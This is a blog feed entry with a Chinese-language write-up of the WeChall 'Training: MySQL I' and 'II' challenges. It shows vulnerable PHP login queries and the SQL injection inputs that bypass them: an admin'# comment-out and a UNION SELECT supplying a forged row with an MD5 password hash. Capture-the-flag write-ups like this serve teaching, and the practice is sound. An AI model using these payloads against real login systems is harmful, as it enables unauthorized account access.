    <content type="html"><![CDATA[<html><head></head><body><h1 id="0x01-Training-MySQL-I"><a href="#0x01-Training-MySQL-I" class="headerlink" title="0x01 Training: MySQL I"></a>0x01 Training: MySQL I</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='$username' AND password='$password'"</span>;<span class="comment">#关键代码</span></span><br></pre></td></tr></tbody></table></figure></div><h3 id="简单的sql注入，利用单引号截断和用-注释掉多余语句"><a href="#简单的sql注入，利用单引号截断和用-注释掉多余语句" class="headerlink" title="简单的sql注入，利用单引号截断和用#注释掉多余语句"></a>简单的sql注入，利用单引号截断和用#注释掉多余语句</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'#</span></span><br></pre></td></tr></tbody></table></figure></div><h1 id="0x02-Training-MySQL-II"><a href="#0x02-Training-MySQL-II" class="headerlink" title="0x02 Training: MySQL II"></a>0x02 Training: MySQL II</h1><h3 id="用户名和密码分开检验，关键代码："><a href="#用户名和密码分开检验，关键代码：" class="headerlink" title="用户名和密码分开检验，关键代码："></a>用户名和密码分开检验，关键代码：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$password = md5($password);</span><br><span class="line"></span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE username='$username'"</span>;   <span class="comment">#注入关键点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === ($result = $db->queryFirst($query))) {   <span class="comment">#表示用了$db这个类中的queryFirst方法，相当于一个函数，查询并返回第一个结果</span></span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Auth2'</span>, $chall->lang(<span class="string">'err_unknown'</span>), <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#############################</span></span><br><span class="line">    <span class="comment">### This is the new check ###</span></span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'password'</span>] !== $password) {  <span class="comment">#验证密码，注入关键点</span></span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Auth2'</span>, $chall->lang(<span class="string">'err_password'</span>), <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    } <span class="comment">#  End of the new code  ###</span></span><br><span class="line">    <span class="comment">#############################</span></span><br></pre></td></tr></tbody></table></figure></div><h3 id="常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id-username-password。如果查询语句为union-select-1-’admin’-md5-abc-，则会返回以下结果："><a href="#常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id-username-password。如果查询语句为union-select-1-’admin’-md5-abc-，则会返回以下结果：" class="headerlink" title="常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id,username,password。如果查询语句为union select 1,’admin’,md5(abc)，则会返回以下结果："></a>常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id,username,password。如果查询语句为union select 1,’admin’,md5(abc)，则会返回以下结果：</h3><p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.3/TrainingMySQL/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.3/TrainingMySQL/1.png" class="lazyload"></a></p><h3 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = uuuh<span class="string">' union select 1,'</span>admin<span class="string">',md5(abc)#</span></span><br><span class="line"><span class="string">password = abc</span></span><br></pre></td></tr></tbody></table></figure></div><script>(function(){    var bp = document.createElement('script');    var curProtocol = window.location.protocol.split(':')[0];    if (curProtocol === 'https') {        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';    }    else {        bp.src = 'http://push.zhanzhang.baidu.com/push.js';    }    var s = document.getElementsByTagName("script")[0];    s.parentNode.insertBefore(bp, s);})();</script></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;0x01-Training-MySQL-I&quot;&gt;&lt;a href=&quot;#0x01-Training-MySQL-I&quot; class=&quot;headerlink&quot; title=&quot;0x01 Training: MySQL I&quot;&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
      <category term="wechall" scheme="https://artd33.github.io/tags/wechall/"/>
    
  </entry>
  
</feed>
